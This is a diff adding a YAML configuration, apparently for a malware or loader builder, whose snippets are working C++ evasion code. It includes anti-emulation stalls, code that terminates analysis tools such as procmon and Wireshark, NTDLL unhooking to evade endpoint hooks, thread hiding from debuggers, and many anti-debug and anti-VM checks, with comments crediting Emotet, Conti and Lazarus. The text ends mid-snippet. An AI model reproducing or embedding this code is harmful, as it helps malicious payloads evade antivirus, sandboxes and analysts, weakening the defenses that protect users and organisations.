@@ -1,0 +1,2664 @@
+# yaml-language-server: $schema=./playbook.schema.json
+sections:
+- header: Anti Emulation
+  template: antiemulation
+  display: Anti-Emulation
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: false
+    snippet: |
+      // No anti-emulation
+
+  - id: SirAllocALot
+    display: SirAllocALot (Memory Exhaustion)
+    default: true
+    inputs:
+    - id: sir_alloc_count
+      label: "Allocation Count"
+      type: textbox
+      defaultValue: "200"
+      placeholder: "200"
+    - id: sir_iteration_count
+      label: "Iterations"
+      type: textbox
+      defaultValue: "3"
+      placeholder: "3"
+    - id: sir_alloc_size
+      label: "Alloc Size (bytes)"
+      type: textbox
+      defaultValue: "4096"
+      placeholder: "4096"
+    snippet: |
+      // Anti-emulation: Memory Allocation Exhaustion (SirAllocALot)
+      // Floods the emulator with VirtualAlloc calls across multiple iterations.
+      // AV emulators have finite memory and API-call budgets — this overflows both.
+      // Technique seen in: TrickBot, Ursnif, Emotet and many others.
+      {
+          const int  COUNT  = $sir_alloc_count$;
+          const int  ITERS  = $sir_iteration_count$;
+          const int  SIZE   = $sir_alloc_size$;
+          void**     allocs = new void*[COUNT]{};
+          DWORD      prot;
+
+          for (int i = 0; i < ITERS; i++) {
+              // Allocate and dirty every page to force real memory pressure
+              for (int n = 0; n < COUNT; n++) {
+                  allocs[n] = VirtualAlloc(NULL, SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                  if (allocs[n]) {
+                      volatile BYTE* p = (BYTE*)allocs[n];
+                      for (int j = 0; j < SIZE; j += 256) p[j] = (BYTE)(j ^ i ^ n);
+                  }
+              }
+              // Flip all pages to RX — triggers emulator permission-change tracking
+              for (int n = 0; n < COUNT; n++)
+                  if (allocs[n]) VirtualProtect(allocs[n], SIZE, PAGE_EXECUTE_READ, &prot);
+              // Free all
+              for (int n = 0; n < COUNT; n++)
+                  if (allocs[n]) VirtualFree(allocs[n], 0, MEM_RELEASE);
+          }
+          delete[] allocs;
+      }
+
+  - id: TimeRawKernel
+    display: Kernel Time Busy-Wait (KUSER_SHARED_DATA)
+    default: false
+    inputs:
+    - id: time_raw_kernel_ms
+      label: "Delay (ms)"
+      type: textbox
+      defaultValue: "3000"
+      placeholder: "3000"
+    snippet: |
+      // Anti-emulation: Busy-wait using the kernel time register in KUSER_SHARED_DATA.
+      // Reads TickCount directly from the read-only shared user page at 0x7FFE0000.
+      // Completely bypasses Sleep() / NtDelayExecution hooks — no API calls made.
+      // Formula: ms = (TickCount.LowPart * TickCountMultiplier) >> 24  (= GetTickCount())
+      {
+          auto get_ms = []() -> DWORD {
+              ULONG mult  = *(volatile ULONG*)0x7ffe0004;  // KUSER_SHARED_DATA.TickCountMultiplier
+              ULONG ticks = *(volatile ULONG*)0x7ffe0320;  // KUSER_SHARED_DATA.TickCount.LowPart
+              return (DWORD)(((ULONGLONG)ticks * mult) >> 24);
+          };
+
+          DWORD start = get_ms();
+          while ((get_ms() - start) < (DWORD)$time_raw_kernel_ms$) {}
+      }
+
+  - id: NtDelayExecution
+    display: NtDelayExecution (Direct NTAPI Delay)
+    default: false
+    inputs:
+    - id: nt_delay_seconds
+      label: "Delay (seconds)"
+      type: textbox
+      defaultValue: "5"
+      placeholder: "5"
+    snippet: |
+      // Anti-emulation: Delay via NtDelayExecution — harder to hook than Sleep().
+      // Passes a negative LARGE_INTEGER (relative time expressed in 100ns intervals).
+      // Used by Conti, Emotet, and many modern loaders as a reliable stalling primitive.
+      {
+          typedef NTSTATUS (NTAPI* pfnNtDelayExecution)(BOOLEAN Alertable, PLARGE_INTEGER Interval);
+          LARGE_INTEGER delay = {};
+          delay.QuadPart = -((LONGLONG)$nt_delay_seconds$ * 10000000LL);  // seconds to 100ns (negative = relative)
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          if (ntdll) {
+              auto fn = (pfnNtDelayExecution)GetProcAddress(ntdll, "NtDelayExecution");
+              if (fn) fn(FALSE, &delay);
+          }
+      }
+
+  - id: HeavyComputation
+    display: Heavy Computation (CPU Cycle Exhaustion)
+    default: false
+    inputs:
+    - id: heavy_comp_iterations
+      label: "Iterations"
+      type: textbox
+      defaultValue: "100000000"
+      placeholder: "100000000"
+    snippet: |
+      // Anti-emulation: CPU cycle exhaustion — most emulators cap instruction counts.
+      // Mixes rotation, XOR, and prime multiplication so the loop resists optimization.
+      // Technique observed in Lazarus Group loaders and various nation-state implants.
+      {
+          volatile ULONG r = 0xDEADBEEF;
+          for (ULONG i = 0; i < (ULONG)$heavy_comp_iterations$; i++) {
+              r = (r << 1) | (r >> 31);    // rotate left 1
+              r ^= i;
+              r = (r * 1000003UL) + 13UL;  // prime multiplier keeps distribution wide
+          }
+          if (r == 0) Sleep(1);  // opaque use prevents dead-code elimination
+      }
+
+  - id: FlsCallbacks
+    display: FLS Callback Abuse
+    default: false
+    snippet: |
+      // Anti-emulation: Verify FLS (Fiber Local Storage) callbacks execute correctly.
+      // Many AV emulators do not properly implement the FLS destructor callback mechanism.
+      // If the callback is never fired after FlsFree(), we are likely being emulated.
+      // Technique documented by: Checkpoint Research, BlackHat 2019.
+      {
+          volatile BOOL called = FALSE;
+          auto cb = [](PVOID data) -> VOID {
+              *(volatile BOOL*)data = TRUE;
+          };
+
+          DWORD idx = FlsAlloc((PFLS_CALLBACK_FUNCTION)cb);
+          if (idx != FLS_OUT_OF_INDEXES) {
+              FlsSetValue(idx, (PVOID)&called);
+              FlsFree(idx);
+              if (!called) ExitProcess(0);  // callback was never invoked — emulator detected
+          }
+      }
+
+  - id: RdtscTiming
+    display: RDTSC Cycle Timing Check
+    default: false
+    includes: "#include <intrin.h>"
+    inputs:
+    - id: rdtsc_min_cycles
+      label: "Min Expected Cycles"
+      type: textbox
+      defaultValue: "500000"
+      placeholder: "500000"
+    snippet: |
+      // Anti-emulation: RDTSC timing check — emulators run orders of magnitude slower.
+      // We measure the CPU cycle cost of a known workload. On bare metal this is fast;
+      // inside an emulator the same work takes far fewer "emulated" cycles,
+      // or the counter behaves inconsistently across the emulated instruction stream.
+      {
+          volatile ULONG work = 0;
+          unsigned __int64 t1 = __rdtsc();
+          for (volatile int i = 0; i < 100000; i++) work += (ULONG)i;
+          unsigned __int64 t2 = __rdtsc();
+          if ((t2 - t1) < (unsigned __int64)$rdtsc_min_cycles$) {
+              ExitProcess(0);  // cycle delta is impossibly small — emulator detected
+          }
+      }
+
+  - id: SleepSkipCheck
+    display: Sleep Skip Detection
+    default: false
+    inputs:
+    - id: sleep_check_ms
+      label: "Sleep Duration (ms)"
+      type: textbox
+      defaultValue: "1500"
+      placeholder: "1500"
+    snippet: |
+      // Anti-emulation: Detect if Sleep() was fast-forwarded by a sandbox/emulator.
+      // Emulators and sandboxes commonly patch Sleep() to return immediately in order
+      // to speed up analysis. We verify via QueryPerformanceCounter that real time passed.
+      {
+          LARGE_INTEGER freq, t1, t2;
+          QueryPerformanceFrequency(&freq);
+          QueryPerformanceCounter(&t1);
+          Sleep($sleep_check_ms$);
+          QueryPerformanceCounter(&t2);
+          DWORD elapsed_ms = (DWORD)(((t2.QuadPart - t1.QuadPart) * 1000LL) / freq.QuadPart);
+          if (elapsed_ms < (DWORD)($sleep_check_ms$ / 2)) {
+              ExitProcess(0);  // sleep was skipped — sandbox/emulator detected
+          }
+      }
+- header: Anti Analysis
+  template: antianalysis
+  display: Anti-Analysis
+  allowMultiple: true
+  items:
+  - id: HideThread
+    display: Hide From Debugger
+    default: true
+    snippet: |
+      {
+          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
+          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
+          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0);
+      }
+  - id: TerminateAnalysis
+    display: Terminate Analysis Tools
+    default: false
+    snippet: |
+      {
+          const wchar_t* targets[] = {
+              L"procmon.exe", L"procexp.exe", L"wireshark.exe", 
+              L"fiddler.exe", L"ProcessHacker.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 5; i++) {
+                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                              if (hp) { TerminateProcess(hp, 0); CloseHandle(hp); }
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
+  - id: KillAnalysisTools
+    display: Terminate Analysis Processes
+    default: true
+    snippet: |
+      // Actively terminate analysis tools
+      {
+          const wchar_t* targets[] = {
+              L"procmon.exe", L"procexp.exe", L"procexp64.exe",
+              L"Wireshark.exe", L"fiddler.exe", L"tcpview.exe",
+              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
+              L"ProcessHacker.exe", L"perfmon.exe"
+          };
+          
+          HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (snap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe = {sizeof(pe)};
+              if (Process32FirstW(snap, &pe)) {
+                  do {
+                      for (int i = 0; i < 11; i++) {
+                          if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+                              HANDLE hp = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                              if (hp) {
+                                  TerminateProcess(hp, 0);
+                                  CloseHandle(hp);
+                              }
+                          }
+                      }
+                  } while (Process32NextW(snap, &pe));
+              }
+              CloseHandle(snap);
+          }
+      }
+
+  - id: UnhookNtdll
+    display: NTDLL Unhooking
+    default: false
+    snippet: |
+      // Unhook NTDLL by mapping fresh copy from disk
+      {
+          HANDLE hFile = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", 
+                                     GENERIC_READ, FILE_SHARE_READ, NULL, 
+                                     OPEN_EXISTING, 0, NULL);
+          if (hFile != INVALID_HANDLE_VALUE) {
+              HANDLE hMap = CreateFileMappingW(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
+              if (hMap) {
+                  PVOID pClean = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
+                  if (pClean) {
+                      HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
+                      PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hNtdll;
+                      PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDos->e_lfanew);
+                      
+                      PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+                      for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+                          if (memcmp(pSec[i].Name, ".text", 5) == 0) {
+                              DWORD oldProt;
+                              PVOID pDest = (PVOID)((PBYTE)hNtdll + pSec[i].VirtualAddress);
+                              PVOID pSrc = (PVOID)((PBYTE)pClean + pSec[i].VirtualAddress);
+                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProt);
+                              memcpy(pDest, pSrc, pSec[i].Misc.VirtualSize);
+                              VirtualProtect(pDest, pSec[i].Misc.VirtualSize, oldProt, &oldProt);
+                              break;
+                          }
+                      }
+                      UnmapViewOfFile(pClean);
+                  }
+                  CloseHandle(hMap);
+              }
+              CloseHandle(hFile);
+          }
+      }
+
+  - id: HideFromDebugger
+    display: Hide Thread From Debugger
+    default: false
+    snippet: |
+      // Use NtSetInformationThread to hide from debugger
+      {
+          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
+          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
+          if (NtSIT) {
+              // ThreadHideFromDebugger = 0x11
+              NtSIT(GetCurrentThread(), 0x11, NULL, 0);
+          }
+      }
+- header: Anti Debugging
+  template: antidebugging
+  display: Anti-Debugging
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: false
+    snippet: |
+      // No anti-debugging
+  - id: IsDebuggerPresent
+    display: IsDebuggerPresent API
+    default: true
+    snippet: |
+      // Anti-debug: Check IsDebuggerPresent
+      if (IsDebuggerPresent()) {
+          return 0;
+      }
+  - id: CheckRemoteDebuggerPresent
+    display: CheckRemoteDebuggerPresent API
+    default: false
+    snippet: |
+      // Anti-debug: Check for remote debugger
+      {
+          BOOL debuggerPresent = FALSE;
+          if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent)) {
+              if (debuggerPresent) {
+                  return 0;
+              }
+          }
+      }
+  - id: PebBeingDebugged
+    display: PEB BeingDebugged Flag
+    default: false
+    snippet: |
+      // Anti-debug: Direct PEB check
+      {
+          #ifdef _WIN64
+          PPEB pPeb = (PPEB)__readgsqword(0x60);
+          #else
+          PPEB pPeb = (PPEB)__readfsdword(0x30);
+          #endif
+          if (pPeb->BeingDebugged) {
+              return 0;
+          }
+      }
+  - id: NtGlobalFlag
+    display: NtGlobalFlag Check
+    default: false
+    snippet: |
+      // Anti-debug: Check NtGlobalFlag in PEB
+      // Debuggers set heap flags: FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+      {
+          #ifdef _WIN64
+          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readgsqword(0x60) + 0xBC);
+          #else
+          PDWORD pNtGlobalFlag = (PDWORD)((PBYTE)__readfsdword(0x30) + 0x68);
+          #endif
+          if (*pNtGlobalFlag & 0x70) { // FLG_HEAP_* flags
+              return 0;
+          }
+      }
+  - id: HeapFlags
+    display: Heap Flags Check
+    default: false
+    snippet: |
+      // Anti-debug: Check heap flags set by debugger
+      {
+          #ifdef _WIN64
+          PPEB pPeb = (PPEB)__readgsqword(0x60);
+          PVOID heap = (PVOID)*(PDWORD_PTR)((PBYTE)pPeb + 0x30);
+          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x70);
+          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x74);
+          #else
+          PPEB pPeb = (PPEB)__readfsdword(0x30);
+          PVOID heap = (PVOID)*(PDWORD)((PBYTE)pPeb + 0x18);
+          DWORD heapFlags = *(PDWORD)((PBYTE)heap + 0x40);
+          DWORD forceFlags = *(PDWORD)((PBYTE)heap + 0x44);
+          #endif
+          if (heapFlags & ~HEAP_GROWABLE || forceFlags != 0) {
+              return 0;
+          }
+      }
+  - id: CloseHandleException
+    display: CloseHandle Invalid Handle
+    default: false
+    snippet: |
+      // Anti-debug: CloseHandle with invalid handle causes exception under debugger
+      __try {
+          CloseHandle((HANDLE)0xDEADBEEF);
+      }
+      __except (GetExceptionCode() == EXCEPTION_INVALID_HANDLE ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH) {
+          // Exception caught = debugger present
+          return 0;
+      }
+  - id: OutputDebugString
+    display: OutputDebugString Error Check
+    default: false
+    snippet: |
+      // Anti-debug: OutputDebugString sets error differently when debugger present
+      {
+          SetLastError(0);
+          OutputDebugStringA("Test");
+          if (GetLastError() == 0) {
+              // Debugger consumed the string
+              return 0;
+          }
+      }
+  - id: HardwareBreakpoints
+    display: Hardware Breakpoints Detection
+    default: false
+    snippet: |
+      // Anti-debug: Check for hardware breakpoints via debug registers
+      {
+          CONTEXT ctx = {0};
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+          if (GetThreadContext(GetCurrentThread(), &ctx)) {
+              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+                  return 0;
+              }
+          }
+      }
+  - id: TimingRdtsc
+    display: RDTSC Timing Check
+    default: false
+    snippet: |
+      // Anti-debug: Timing check using RDTSC
+      // Debugger stepping causes significant delay
+      {
+          unsigned __int64 start = __rdtsc();
+          
+          // Small operation
+          volatile int x = 0;
+          for (int i = 0; i < 100; i++) x++;
+          
+          unsigned __int64 end = __rdtsc();
+          
+          // Threshold for normal execution (adjust based on CPU)
+          if ((end - start) > 0x100000) {
+              return 0;
+          }
+      }
+
+  - id: NtQueryInformationProcess
+    display: NtQueryInformationProcess Debug Port
+    default: false
+    snippet: |
+      // Anti-debug: Query debug port via NtQueryInformationProcess
+      {
+          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          if (ntdll) {
+              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+              if (NtQIP) {
+                  HANDLE debugPort = NULL;
+                  NTSTATUS status = NtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL); // ProcessDebugPort = 7
+                  if (status == 0 && debugPort != NULL) {
+                      return 0;
+                  }
+              }
+          }
+      }
+  - id: ParentProcessCheck
+    display: Parent Process Check
+    default: false
+    snippet: |
+      // Anti-debug: Check if parent process is a known debugger
+      {
+          typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+          HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+          if (ntdll) {
+              pNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
+              if (NtQIP) {
+                  struct { PVOID Reserved1; PVOID PebBaseAddress; PVOID Reserved2[2]; ULONG_PTR UniqueProcessId; PVOID Reserved3; } pbi;
+                  if (NtQIP(GetCurrentProcess(), 0, &pbi, sizeof(pbi), NULL) == 0) {
+                      HANDLE hParent = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)(ULONG_PTR)pbi.Reserved3);
+                      if (hParent) {
+                          WCHAR parentName[MAX_PATH] = {0};
+                          DWORD size = MAX_PATH;
+                          if (QueryFullProcessImageNameW(hParent, 0, parentName, &size)) {
+                              _wcslwr_s(parentName, MAX_PATH);
+                              if (wcsstr(parentName, L"ollydbg") || wcsstr(parentName, L"x64dbg") ||
+                                  wcsstr(parentName, L"windbg") || wcsstr(parentName, L"ida") ||
+                                  wcsstr(parentName, L"immunity") || wcsstr(parentName, L"radare")) {
+                                  CloseHandle(hParent);
+                                  return 0;
+                              }
+                          }
+                          CloseHandle(hParent);
+                      }
+                  }
+              }
+          }
+      }
+  - id: TrapFlag
+    display: Trap Flag Detection
+    default: false
+    snippet: |
+      // Anti-debug: Single-step trap flag detection
+      #ifdef _M_IX86
+      __try {
+          __asm {
+              pushfd
+              or dword ptr [esp], 0x100 ; Set trap flag
+              popfd
+              nop
+          }
+      }
+      __except(EXCEPTION_EXECUTE_HANDLER) {
+          goto trap_ok;
+      }
+      return 0;
+      trap_ok:;
+      #else
+      // x64: Use NtSetInformationThread to hide from debugger
+      {
+          typedef NTSTATUS (NTAPI *pNtSIT)(HANDLE, ULONG, PVOID, ULONG);
+          pNtSIT NtSIT = (pNtSIT)GetProcAddress(GetModuleHandleA("ntdll"), "NtSetInformationThread");
+          if (NtSIT) NtSIT(GetCurrentThread(), 0x11, NULL, 0); // ThreadHideFromDebugger
+      }
+      #endif
+  - id: FullAntiDebug
+    display: Full Anti-Debug Suite
+    default: true
+    snippet: |
+      // Complete anti-debug implementation
+      {
+          // 1. IsDebuggerPresent
+          if (IsDebuggerPresent()) ExitProcess(0);
+          
+          // 2. CheckRemoteDebuggerPresent
+          BOOL remote = FALSE;
+          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+          if (remote) ExitProcess(0);
+          
+          // 3. PEB flags
+          #ifdef _WIN64
+          PPEB peb = (PPEB)__readgsqword(0x60);
+          DWORD ntg = *(DWORD*)((PBYTE)peb + 0xBC);
+          #else
+          PPEB peb = (PPEB)__readfsdword(0x30);
+          DWORD ntg = *(DWORD*)((PBYTE)peb + 0x68);
+          #endif
+          if (peb->BeingDebugged) ExitProcess(0);
+          if (ntg & 0x70) ExitProcess(0);
+          
+          // 4. Hardware breakpoints
+          CONTEXT ctx = {0};
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+          GetThreadContext(GetCurrentThread(), &ctx);
+          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
+          
+          // 5. RDTSC timing
+          unsigned __int64 t1 = __rdtsc();
+          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
+          if (__rdtsc() - t1 > 0x100000) ExitProcess(0);
+          
+          // 6. Debug port
+          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
+          if (NtQIP) {
+              HANDLE port = NULL;
+              NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL);
+              if (port) ExitProcess(0);
+              
+              ULONG flags = 0;
+              NtQIP(GetCurrentProcess(), 0x1F, &flags, sizeof(flags), NULL); // ProcessDebugFlags
+              if (flags == 0) ExitProcess(0);
+          }
+          
+          // 7. OutputDebugString
+          SetLastError(0);
+          OutputDebugStringA("X");
+          if (GetLastError() == 0) ExitProcess(0);
+      }
+
+  - id: AllChecks
+    display: All Anti-Debug Checks
+    default: true
+    snippet: |
+      // Comprehensive anti-debugging
+      {
+          // API checks
+          if (IsDebuggerPresent()) ExitProcess(0);
+          BOOL dbg = FALSE;
+          CheckRemoteDebuggerPresent(GetCurrentProcess(), &dbg);
+          if (dbg) ExitProcess(0);
+
+          // PEB checks
+          #ifdef _WIN64
+          PPEB peb = (PPEB)__readgsqword(0x60);
+          PDWORD ntg = (PDWORD)((PBYTE)peb + 0xBC);
+          #else
+          PPEB peb = (PPEB)__readfsdword(0x30);
+          PDWORD ntg = (PDWORD)((PBYTE)peb + 0x68);
+          #endif
+          if (peb->BeingDebugged) ExitProcess(0);
+          if (*ntg & 0x70) ExitProcess(0);
+
+          // Hardware breakpoints
+          CONTEXT ctx = {0};
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+          GetThreadContext(GetCurrentThread(), &ctx);
+          if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) ExitProcess(0);
+
+          // Timing check
+          unsigned __int64 t = __rdtsc();
+          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
+          if (__rdtsc() - t > 0x100000) ExitProcess(0);
+
+          // Debug port
+          typedef NTSTATUS (NTAPI *pNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+          pNtQIP NtQIP = (pNtQIP)GetProcAddress(GetModuleHandleA("ntdll"), "NtQueryInformationProcess");
+          if (NtQIP) {
+              HANDLE port = NULL;
+              if (NtQIP(GetCurrentProcess(), 7, &port, sizeof(port), NULL) == 0 && port) ExitProcess(0);
+          }
+      }
+  - id: LayeredChecks
+    display: Layered Debugger Detection
+    default: true
+    snippet: |
+      // Multiple anti-debug checks
+      {
+          // Check 1: IsDebuggerPresent
+          if (IsDebuggerPresent()) return 0;
+
+          // Check 2: Remote debugger
+          BOOL remote = FALSE;
+          CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
+          if (remote) return 0;
+
+          // Check 3: PEB flag
+          #ifdef _WIN64
+          if (((PPEB)__readgsqword(0x60))->BeingDebugged) return 0;
+          #else
+          if (((PPEB)__readfsdword(0x30))->BeingDebugged) return 0;
+          #endif
+
+          // Check 4: Hardware breakpoints
+          CONTEXT ctx = {0};
+          ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+          if (GetThreadContext(GetCurrentThread(), &ctx)) {
+              if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 0;
+          }
+
+          // Check 5: Timing
+          unsigned __int64 t1 = __rdtsc();
+          volatile int x = 0; for (int i = 0; i < 100; i++) x++;
+          if (__rdtsc() - t1 > 0x100000) return 0;
+      }
+- header: Anti Sandbox
+  template: antisandbox
+  display: Anti-Sandbox/VM
+  allowMultiple: true
+  items:
+  - id: None
+    display: None (Skip)
+    default: true
+    snippet: |
+      // No anti-sandbox
+  - id: CpuidHypervisor
+    display: CPUID Hypervisor Bit
+    default: false
+    snippet: |
+      // Anti-sandbox: Check CPUID hypervisor bit
+      {
+          int cpuInfo[4] = {0};
+          __cpuid(cpuInfo, 1);
+          if (cpuInfo[2] & (1 << 31)) {
+              // Hypervisor present
+              return 0;
+          }
+      }
+  - id: CpuidVMVendor
+    display: CPUID VM Vendor String
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for VM vendor strings via CPUID
+      {
+          int cpuInfo[4] = {0};
+          __cpuid(cpuInfo, 0x40000000);
+          char vendor[13] = {0};
+          memcpy(vendor, &cpuInfo[1], 4);
+          memcpy(vendor + 4, &cpuInfo[2], 4);
+          memcpy(vendor + 8, &cpuInfo[3], 4);
+          
+          // Known VM vendors
+          if (strstr(vendor, "VMwareVMware") || strstr(vendor, "Microsoft Hv") ||
+              strstr(vendor, "VBoxVBoxVBox") || strstr(vendor, "KVMKVMKVM") ||
+              strstr(vendor, "XenVMMXenVMM") || strstr(vendor, "prl hyperv")) {
+              return 0;
+          }
+      }
+
+  - id: MacAddressCheck
+    display: MAC Address VM Detection
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for VM MAC address prefixes
+      {
+          IP_ADAPTER_INFO adapterInfo[16];
+          DWORD bufLen = sizeof(adapterInfo);
+          if (GetAdaptersInfo(adapterInfo, &bufLen) == ERROR_SUCCESS) {
+              PIP_ADAPTER_INFO pAdapter = adapterInfo;
+              while (pAdapter) {
+                  // VMware: 00:0C:29, 00:50:56, 00:05:69
+                  // VirtualBox: 08:00:27
+                  // Hyper-V: 00:15:5D
+                  // Parallels: 00:1C:42
+                  if ((pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x0C && pAdapter->Address[2] == 0x29) ||
+                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x50 && pAdapter->Address[2] == 0x56) ||
+                      (pAdapter->Address[0] == 0x08 && pAdapter->Address[1] == 0x00 && pAdapter->Address[2] == 0x27) ||
+                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x15 && pAdapter->Address[2] == 0x5D) ||
+                      (pAdapter->Address[0] == 0x00 && pAdapter->Address[1] == 0x1C && pAdapter->Address[2] == 0x42)) {
+                      return 0;
+                  }
+                  pAdapter = pAdapter->Next;
+              }
+          }
+      }
+  - id: RegistryVMCheck
+    display: Registry VM Artifacts
+    default: false
+    snippet: |
+      // Anti-sandbox: Check registry for VM artifacts
+      {
+          HKEY hKey;
+          const wchar_t* vmKeys[] = {
+              L"SOFTWARE\\VMware, Inc.\\VMware Tools",
+              L"SOFTWARE\\Oracle\\VirtualBox Guest Additions",
+              L"SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
+              L"SYSTEM\\CurrentControlSet\\Services\\vmci",
+              L"SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters"
+          };
+          for (int i = 0; i < 5; i++) {
+              if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, vmKeys[i], 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                  RegCloseKey(hKey);
+                  return 0;
+              }
+          }
+      }
+  - id: ProcessListCheck
+    display: Sandbox Process Detection
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for sandbox/analysis processes
+      {
+          const wchar_t* sandboxProcs[] = {
+              L"vmtoolsd.exe", L"vmwaretray.exe", L"vmwareuser.exe",
+              L"vboxservice.exe", L"vboxtray.exe",
+              L"sandboxiedcomlaunch.exe", L"sandboxierpcss.exe",
+              L"procmon.exe", L"procmon64.exe", L"procexp.exe", L"procexp64.exe",
+              L"wireshark.exe", L"fiddler.exe", L"tcpview.exe",
+              L"autoruns.exe", L"filemon.exe", L"regmon.exe",
+              L"idaq.exe", L"idaq64.exe", L"x64dbg.exe", L"x32dbg.exe"
+          };
+          
+          HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+          if (hSnap != INVALID_HANDLE_VALUE) {
+              PROCESSENTRY32W pe32 = {sizeof(pe32)};
+              if (Process32FirstW(hSnap, &pe32)) {
+                  do {
+                      for (int i = 0; i < 19; i++) {
+                          if (_wcsicmp(pe32.szExeFile, sandboxProcs[i]) == 0) {
+                              CloseHandle(hSnap);
+                              return 0;
+                          }
+                      }
+                  } while (Process32NextW(hSnap, &pe32));
+              }
+              CloseHandle(hSnap);
+          }
+      }
+
+  - id: LowResourceCheck
+    display: Low Resource Detection
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for unrealistically low system resources
+      {
+          // Check RAM (sandboxes often have <2GB)
+          MEMORYSTATUSEX memStatus = {sizeof(memStatus)};
+          if (GlobalMemoryStatusEx(&memStatus)) {
+              if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) { // < 2GB
+                  return 0;
+              }
+          }
+          
+          // Check disk size (sandboxes often have <60GB)
+          ULARGE_INTEGER totalBytes;
+          if (GetDiskFreeSpaceExW(L"C:\\", NULL, &totalBytes, NULL)) {
+              if (totalBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) { // < 60GB
+                  return 0;
+              }
+          }
+          
+          // Check number of processors
+          SYSTEM_INFO sysInfo;
+          GetSystemInfo(&sysInfo);
+          if (sysInfo.dwNumberOfProcessors < 2) {
+              return 0;
+          }
+      }
+
+  - id: UsernameCheck
+    display: Sandbox Username Detection
+    default: false
+    snippet: |
+      // Anti-sandbox: Check for common sandbox usernames
+      {
